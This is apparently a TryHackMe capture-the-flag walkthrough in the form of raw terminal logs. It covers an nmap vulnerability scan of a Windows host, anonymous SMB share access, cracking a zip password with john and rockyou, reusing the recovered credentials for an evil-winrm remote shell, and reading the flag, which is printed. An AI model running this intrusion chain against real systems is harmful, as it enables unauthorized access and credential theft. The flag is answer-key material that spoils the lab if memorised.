root@ip-10-114-66-144:~# nmap -sV -sC --script vuln 10.200.150.20
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-04 07:16 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.200.150.20
Host is up (0.021s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp  open  microsoft-ds?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.80 seconds
root@ip-10-114-66-144:~# 


smbclient -L //10.200.150.20 -N
root@ip-10-114-66-144:~/Desktop# smbclient -L //10.200.150.20 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Safe            Disk      
SMB1 disabled -- no workgroup available
root@ip-10-114-66-144:~/Desktop# 

smbclient //10.200.150.20/Safe -N
ls
get creds.zip
exit
unzip creds.zip   // not supported = conclusion that it is protected by a password

zip2john creds.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
password FOUND: Passw0rd

unzip -P Passw0rd creds.zip // not supported = mayby 7zip
7z x creds.zip -pPassw0rd
cat creds.txt
Username: John
Password: VerySafePassword!

SMB1 disabled -- no workgroup available
root@ip-10-114-66-144:~/Desktop# smbclient //10.200.150.20/C$ -U 'John%VerySafePassword!'
tree connect failed: NT_STATUS_ACCESS_DENIED
root@ip-10-114-66-144:~/Desktop# smbclient //10.200.150.20/ADMIN$ -U 'John%VerySafePassword!'
tree connect failed: NT_STATUS_ACCESS_DENIED
root@ip-10-114-66-144:~/Desktop# smbclient //10.200.150.20/IPC$ -U 'John%VerySafePassword!'
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 
// nothing here so next 


root@ip-10-114-66-144:~/Desktop# evil-winrm -i 10.200.150.20 -u John -p 'VerySafePassword!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> dir
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> dir


    Directory: C:\Users\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        4/18/2025   3:54 PM                3D Objects
d-r---        4/18/2025   3:54 PM                Contacts
d-r---        4/18/2025   3:54 PM                Desktop
d-r---        4/19/2025  12:15 AM                Documents
d-r---        4/18/2025   3:54 PM                Downloads
d-r---        4/18/2025   3:54 PM                Favorites
d-r---        4/18/2025   3:54 PM                Links
d-r---        4/18/2025   3:54 PM                Music
d-r---        4/18/2025   3:54 PM                Pictures
d-r---        4/18/2025   3:54 PM                Saved Games
d-r---        4/18/2025   3:54 PM                Searches
d-r---        4/18/2025   3:54 PM                Videos


*Evil-WinRM* PS C:\Users\john> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2025   4:55 AM                Administrator
d-----        4/10/2025   7:23 PM                Administrator.TRYHACKME
d-----        4/24/2025   7:59 AM                g.knowles
d-----        4/18/2025   3:54 PM                john
d-r---         4/2/2025   5:27 PM                Public


*Evil-WinRM* PS C:\Users> whoami
tryhackme\john
*Evil-WinRM* PS C:\Users> cd ..
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---         4/2/2025   6:04 PM                Program Files
d-----         4/2/2025   5:27 PM                Program Files (x86)
d-----        4/23/2025   3:19 PM                Safe
d-----        4/23/2025   4:23 PM                Scripts
d-r---        4/18/2025   4:42 PM                Users
d-----         3/4/2026   7:35 AM                Windows
-a----         3/4/2026   7:35 AM             45 flag.txt


*Evil-WinRM* PS C:\> type flag.txt
THM{d23e153b-e776-4f1f-ab9b-5ebf77ef5847}
*Evil-WinRM* PS C:\> 

flag: THM{d23e153b-e776-4f1f-ab9b-5ebf77ef5847}

